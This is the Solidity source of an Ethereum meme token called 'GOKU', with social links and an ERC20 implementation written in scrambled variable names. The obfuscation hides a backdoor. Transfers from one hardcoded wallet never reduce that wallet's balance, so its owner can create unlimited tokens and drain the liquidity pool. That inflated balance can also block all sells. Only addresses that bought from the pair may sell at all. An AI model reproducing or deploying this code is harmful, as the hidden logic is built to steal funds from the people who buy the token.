/**

Goku   $GOKU
MAKING ANIME GREAT AGAIN.


Twitter: https://twitter.com/GokuEthereum
Telegram: https://t.me/GokuEthereum
Website: https://gokueth.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rwkje(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rwkje(a, b, "SafeMath");
    }

    function  _rwkje(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract GOKU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _Trceybk;
    address payable private _Fiykueq;
    address private _corteu;

    string private constant _name = unicode"GOKU";
    string private constant _symbol = unicode"GOKU";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _pakhzar;
    mapping (address => bool) private _yrbioy;
    mapping(address => uint256) private _ahjukq;
    uint256 public _qvrvbcd = _totalSupply;
    uint256 public _Wiorsoe = _totalSupply;
    uint256 public _refTjvu= _totalSupply;
    uint256 public _XoyTevf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yfgvlq=0;
    uint256 private _uerpjog=0;
    

    bool private _efecivnr;
    bool public _Dbforkf = false;
    bool private pjqvxae = false;
    bool private _opgveu = false;


    event _hzqwrpt(uint _qvrvbcd);
    modifier uyvsvr {
        pjqvxae = true;
        _;
        pjqvxae = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _pakhzar[owner(

        )] = true;
        _pakhzar[address
        (this)] = true;
        _pakhzar[
            _Fiykueq] = true;
        _Fiykueq = 
        payable (0xAf3Df7F794714Ec275362CF37cCE4cE090D6C2C4);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rwkje(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 ksudrk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Dbforkf) {
                if (to 
                != address
                (_Trceybk) 
                && to !=
                 address
                 (_corteu)) {
                  require(_ahjukq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _ahjukq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _corteu && to != 
            address(_Trceybk) &&
             !_pakhzar[to] ) {
                require(amount 
                <= _qvrvbcd,
                 "Exceeds the _qvrvbcd.");
                require(balanceOf
                (to) + amount
                 <= _Wiorsoe,
                  "Exceeds the macxizse.");
                if(_uerpjog
                < _yfgvlq){
                  require
                  (! _eiqkcz(to));
                }
                _uerpjog++;
                 _yrbioy
                 [to]=true;
                ksudrk = amount._pvr
                ((_uerpjog>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _corteu &&
             from!= address(this) 
            && !_pakhzar[from] ){
                require(amount <= 
                _qvrvbcd && 
                balanceOf(_Fiykueq)
                <_XoyTevf,
                 "Exceeds the _qvrvbcd.");
                ksudrk = amount._pvr((_uerpjog>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_uerpjog>
                _yfgvlq &&
                 _yrbioy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!pjqvxae 
            && to == _corteu &&
             _opgveu &&
             contractTokenBalance>
             _refTjvu 
            && _uerpjog>
            _yfgvlq&&
             !_pakhzar[to]&&
              !_pakhzar[from]
            ) {
                _transferFrom( _wvedf(amount, 
                _wvedf(contractTokenBalance,
                _XoyTevf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xwvueo(address
                    (this).balance);
                }
            }
        }

        if(ksudrk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(ksudrk);
          emit
           Transfer(from,
           address
           (this),ksudrk);
        }
        _balances[from
        ]= _rwkje(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rwkje(ksudrk));
        emit Transfer
        (from, to, 
        amount.
         _rwkje(ksudrk));
    }

    function _transferFrom(uint256
     tokenAmount) private
      uyvsvr {
        if(tokenAmount==
        0){return;}
        if(!_efecivnr)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Trceybk.WETH();
        _approve(address(this),
         address(
             _Trceybk), 
             tokenAmount);
        _Trceybk.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wvedf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rwkje(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Fiykueq){
            return a ;
        }else{
            return a .
             _rwkje (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvrvbcd = _totalSupply;
        _Wiorsoe = _totalSupply;
        emit _hzqwrpt(_totalSupply);
    }

    function _eiqkcz(address 
    account) private view 
    returns (bool) {
        uint256 eurcdv;
        assembly {
            eurcdv :=
             extcodesize
             (account)
        }
        return eurcdv > 
        0;
    }

    function _xwvueo(uint256
    amount) private {
        _Fiykueq.
        transfer(
            amount);
    }

    function openoTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _efecivnr ) ;
        _Trceybk  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Trceybk), 
            _totalSupply);
        _corteu = 
        IUniswapV2Factory(_Trceybk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Trceybk .
             WETH ( ) );
        _Trceybk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_corteu).
        approve(address(_Trceybk), 
        type(uint)
        .max);
        _opgveu = true;
        _efecivnr = true;
    }

    receive() external payable {}
}